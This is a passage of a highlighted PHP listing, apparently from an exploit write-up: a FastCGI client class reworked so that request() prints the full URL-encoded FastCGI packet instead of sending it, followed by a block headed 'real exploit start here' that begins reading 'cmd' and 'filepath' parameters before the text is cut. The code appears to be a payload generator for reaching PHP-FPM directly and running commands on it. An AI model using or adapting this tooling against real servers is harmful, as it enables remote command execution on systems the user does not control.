    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>
            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">/* nameData &amp; valueData */</span>
        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Read a FastCGI Packet
     *
     * @return array
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token comment">//        $this->connect();</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        fwrite($this->_sock, $request);</span>
<span class="token comment">//        do &#123;</span>
<span class="token comment">//            $resp = $this->readPacket();</span>
<span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span>
<span class="token comment">//                $response .= $resp['content'];</span>
<span class="token comment">//            &#125;</span>
<span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span>
<span class="token comment">//        var_dump($resp);</span>
<span class="token comment">//        if (!is_array($resp)) &#123;</span>
<span class="token comment">//            throw new Exception('Bad request');</span>
<span class="token comment">//        &#125;</span>
<span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span>
<span class="token comment">//            case self::CANT_MPX_CONN:</span>
<span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::OVERLOADED:</span>
<span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::UNKNOWN_ROLE:</span>
<span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::REQUEST_COMPLETE:</span>
<span class="token comment">//                return $response;</span>
<span class="token comment">//        &#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// real exploit start here</span>
<span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span>
<span class="token comment">//    die("Check your input\n");</span>
<span class="token comment">//&#125;</span>
<span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span>
<span class="token comment">//    $filepath = __FILE__;</span>
<span class="token comment">//&#125;else&#123;</span>
<span class="token comment">//    $filepath = $_REQUEST['filepath'];</span>
<span class="token comment">//&#125;</span>

